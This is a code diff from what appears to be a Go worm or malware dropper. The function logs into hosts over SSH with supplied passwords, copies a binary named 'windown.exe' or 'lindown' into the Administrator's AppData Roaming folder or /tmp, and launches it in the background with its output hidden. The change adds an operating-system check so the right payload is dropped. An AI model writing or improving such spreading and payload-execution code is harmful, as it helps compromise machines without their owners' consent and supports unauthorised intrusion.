@@ -129,7 +129,7 @@ func getinssh(myip string, user string, passwd string) (myreturn string) {
 		Auth: []ssh.AuthMethod{
 			ssh.Password(passwd)},
 	}
-	var dest= joinstrings(myip, ":22")
+	var dest = joinstrings(myip, ":22")
 	fmt.Println(dest)
 	connection, err := ssh.Dial("tcp", dest, sshConfig)
 	if err != nil {
@@ -142,11 +142,14 @@ func getinssh(myip string, user string, passwd string) (myreturn string) {
 	}
 
 	session := newsession(connection)
-	scpexec(session, "windown.exe", "\\Users\\Administrator\\AppData\\Roaming\\windown.exe")
-	execlinuxcmd(session, "START /B \\Users\\Administrator\\AppData\\Roaming\\windown.exe")
+	if runtime.GOOS == "windows" {
+		scpexec(session, "windown.exe", "\\Users\\Administrator\\AppData\\Roaming\\windown.exe")
+		execlinuxcmd(session, "START /B \\Users\\Administrator\\AppData\\Roaming\\windown.exe")
+	} else {
 	scpexec(session, "lindown", "/tmp/lindown")
 	execlinuxcmd(session, "./tmp/lindown > /dev/null 2>&1 &")
 	session.Close()
+	}
 	return "yes"
 }
 
